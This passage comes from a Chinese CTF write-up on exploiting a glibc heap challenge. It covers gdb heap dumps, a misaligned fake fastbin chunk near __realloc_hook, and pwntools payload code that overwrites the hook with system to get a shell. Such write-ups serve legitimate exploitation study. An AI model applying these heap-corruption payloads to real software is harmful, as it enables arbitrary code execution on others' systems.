    0x5597171620d0: 0x0000000000000000  0x0000000000000000
    0x5597171620e0: 0x0000000000000000  0x0000000000000000
    0x5597171620f0: 0x0000000000000000  0x0000000000000000
    0x559717162100: 0x0000000000000000  0x0000000000000000
    0x559717162110: 0x0000000000000000  0x0000000000000000
    0x559717162120: 0x0000000000000000  0x0000000000000000
    0x559717162130: 0x0000000000000000  0x00000000000000b1 #payload chunk 
    0x559717162140: 0x0000559717162070  0x0000000000000008
    0x559717162150: 0x0000559717162050  0x0000559717162010
    0x559717162160: 0x0000000000000000  0x0000559717162250
    0x559717162170: 0x0000000000000000  0x0000000000000041
    0x559717162180: 0x00005597171623e0  0x0000000000000088
    0x559717162190: 0x00005597171620b0  0x0000000000000000
    0x5597171621a0: 0x0000000000000000  0x0000559717162250
    0x5597171621b0: 0x0000000000000000  0x0000000000000000
    0x5597171621c0: 0x0000000000000000  0x0000000000000000
    0x5597171621d0: 0x0000000000000000  0x0000000000000071
    0x5597171621e0: 0x00007fc9194dc71d  0x00000000000001c1 #payload end
    0x5597171621f0: 0x00007fc9194dc7b8  0x00007fc9194dc7b8
    0x559717162200: 0x4343434343434343  0x4343434343434343
    0x559717162210: 0x4343434343434343  0x4343434343434343
    0x559717162220: 0x4343434343434343  0x4343434343434343
    0x559717162230: 0x4343434343434343  0x4343434343434343
    0x559717162240: 0x0000000000000000  0x0000000000000041
    0x559717162250: 0x0000559717162290  0x0000000000000020
    0x559717162260: 0x00005597171623b0  0x0000559717162140
    0x559717162270: 0x0000559717162180  0x0000000000000000
    0x559717162280: 0x0000000000000000  0x0000000000000021
    0x559717162290: 0x3434343434343434  0x0000000000000000
    0x5597171622a0: 0x0000000000000200  0x0000000000000100
    0x5597171622b0: 0x4343434343434343  0x4343434343434343
    0x5597171622c0: 0x4343434343434343  0x4343434343434343
    0x5597171622d0: 0x4343434343434343  0x4343434343434343
    0x5597171622e0: 0x4343434343434343  0x4343434343434343
    0x5597171622f0: 0x4343434343434343  0x4343434343434343
    0x559717162300: 0x4343434343434343  0x4343434343434343
    0x559717162310: 0x4343434343434343  0x4343434343434343
既然知道他会覆盖那部分，我就提前查看这部分内容，进行覆盖就行了，然后将gdb.attach放到合并堆块那会，查看具体内容，也就是在这
    gdb.attach(p)
        PUT("a", 0x88, p8(0)*0x88)
        DUMP()
查看具体内容，然后进行覆盖
  1. 我上面所说的这是土方法，我测试出来的。
  2. 其实这些都可以预估的，前面DEL(1) DEL(3),所以会空闲两个结构体，这是fastbin部分的空闲堆块，所以结构体会在原来的chunk上建立，至于申请的0xa8不属于fastbin里，所以他会从大堆块里取，取出能存放0xa8大小的chunk，第二次put的话先申请一个结构体0x40大小的结构体存放红黑树结构，然后在申请0x78大小的chunk，都是从大堆块里取，因为此时fastbin里没有空闲堆块了，第一块用于PUT("a", 0x88, p8(0) _0x88),第二块用于PUT("6"_ 0x8, 0xa8, payload)
  3. PUT("d"*0x8, 0x60, payload)这里先申请一个堆块，同时保护现场，因为原来是fastbin中的一个chunk指向了realloc_hook，现在申请过后，在申请一个堆块便是realloc_hook的地址了
注意：还记得开头申请两个3吗，申请第二个3的时候会先删除前一个chunk，那个就是fastbin里0x70大小的chunk，所以我们覆盖的就是这个chunk的fd
#### 覆写realloc_hook
还记得我前面realloc_hook地址怎么写payload的吗  
看  
realloc_hook_addr-0x8-0x3-0x8  
为什么要这么写呢？  
先看看realloc_hook附近
    gdb-peda$ x/5gx 0x7f14d2670730-0x10
    0x7f14d2670720 :   0x00007f14d2335c90  0x0000000000000000
    0x7f14d2670730 :    0x00007f14d2335c30  0x0000000000000000
    0x7f14d2670740 : 0x0000000000000000
你记得malloc_chunk是怎么样的吗？
    /*
      This struct declaration is misleading (but accurate and necessary).
      It declares a "view" into memory allowing access to necessary
      fields at known offsets from a given base. See explanation below.
    */
    struct malloc_chunk {
      INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
      INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
      struct malloc_chunk* fd;         /* double links -- used only if free. */
      struct malloc_chunk* bk;
      /* Only used for large blocks: pointer to next larger size.  */
      struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
      struct malloc_chunk* bk_nextsize;
    };
如果我们要申请个chunk的话，应当如何，不伪造chunk可不可以，我尝试过，失败了，  
我报了这个错  
**malloc(): memory corruption (fast)**  
经师傅提点，去查看malloc源码
    /*
           If the size qualifies as a fastbin, first check corresponding bin.
           This code is safe to execute even if av is not yet initialized, so we
           can try it without checking, which saves some time on this fast path.
         */
        if ((unsigned long) (nb) fd,
                                                                victim)) != victim);
            // 存在可以利用的chunk
            if (victim != 0) {
                // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。
                // 根据取得的 victim ，利用 chunksize 计算其大小。
                // 利用fastbin_index 计算 chunk 的索引。
                if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) {
                    errstr = "malloc(): memory corruption (fast)";
                errout:
                    malloc_printerr(check_action, errstr, chunk2mem(victim), av);
                    return NULL;
                }
                // 细致的检查。。只有在 DEBUG 的时候有用
                check_remalloced_chunk(av, victim, nb);
                // 将获取的到chunk转换为mem模式
                void *p = chunk2mem(victim);
                // 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff
                alloc_perturb(p, bytes);
                return p;
            }
        }
他会检测大小是否正确，所以不伪造chunk的size部分过不了关的  
在回到这里
    gdb-peda$ x/5gx 0x7f14d2670730-0x10
    0x7f14d2670720 :   0x00007f14d2335c90  0x0000000000000000
    0x7f14d2670730 :    0x00007f14d2335c30  0x0000000000000000
    0x7f14d2670740 : 0x0000000000000000
这样是个chunk的话，pre_size是0x00007f14d2335c90，size是0，这样肯定没法搞，所以我们要利用一点错位，让size成功变成fastbin里的
    gdb-peda$ x/5gx 0x7f14d2670730-0x10-0x3
    0x7f14d267071d: 0x14d2335c90000000  0x000000000000007f
    0x7f14d267072d: 0x14d2335c30000000  0x000000000000007f
    0x7f14d267073d: 0x0000000000000000
这样不就成了，size为0x7f，然后我们现在大小对了，位置错位了，所以最后我们要补个'a'*0x3来填充我们的错位部分，然后在realloc部分填上我们的system地址，最后在调用一次getshell
这里的错位需要自己调试，不一定是跟我一样的错位，在fastbin attack部分也将会学习到
    system_addr = libc_base+system_off
        print("system_addr: 0x%x" % system_addr)
        payload = 'a'*0x3
        payload += p64(system_addr)
        payload += p8(0)*(0x4d+0x8)
        PUT("e"*0x8, 0x60, payload)
        payload = "/bin/sh"
        payload += p8(0)*0x12 
        GET(payload)
到了结尾了，这里有个点说明下，我们malloc(0x7f)跟伪造chunk的size是完全不一样的，我们malloc过后还要经过计算才得到size，你看普通malloc(0x7f)
    0x557c81b53130: 0x0000000000000000  0x0000000000000041
    0x557c81b53140: 0x0000557c81b53070  0x000000000000007f
    0x557c81b53150: 0x0000557c81b53180  0x0000557c81b53010
    0x557c81b53160: 0x0000557c81b53210  0x0000000000000000
    0x557c81b53170: 0x0000000000000000  0x0000000000000091
    0x557c81b53180: 0x4242424242424242  0x4242424242424242
    0x557c81b53190: 0x4242424242424242  0x4242424242424242
    0x557c81b531a0: 0x4242424242424242  0x4242424242424242
    0x557c81b531b0: 0x4242424242424242  0x4242424242424242
    0x557c81b531c0: 0x4242424242424242  0x4242424242424242
    0x557c81b531d0: 0x4242424242424242  0x4242424242424242
    0x557c81b531e0: 0x4242424242424242  0x4242424242424242
    0x557c81b531f0: 0x4242424242424242  0x0042424242424242
他获得的是0x91大小的chunk，具体size计算可以自己看源码，我只是点出这个点而已
## 总结
  1. 这道题知识点较多，利用较复杂，利用堆块重叠泄露，在用fastbin attack
  2. 错位伪造chunk知识点，补上了，第一次遇到
  3. 这道题需要对堆的分配机制较为熟练才比较好做，像我调试了很久，最终才的出来的结论
  4. 遇到错误要学会去查看源码，好几个师傅都叫我看源码，最后才懂的
## 参考链接
[看雪的师傅的文章](https://bbs.pediy.com/thread-246966.htm)
[ctf-wiki原理介绍](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/)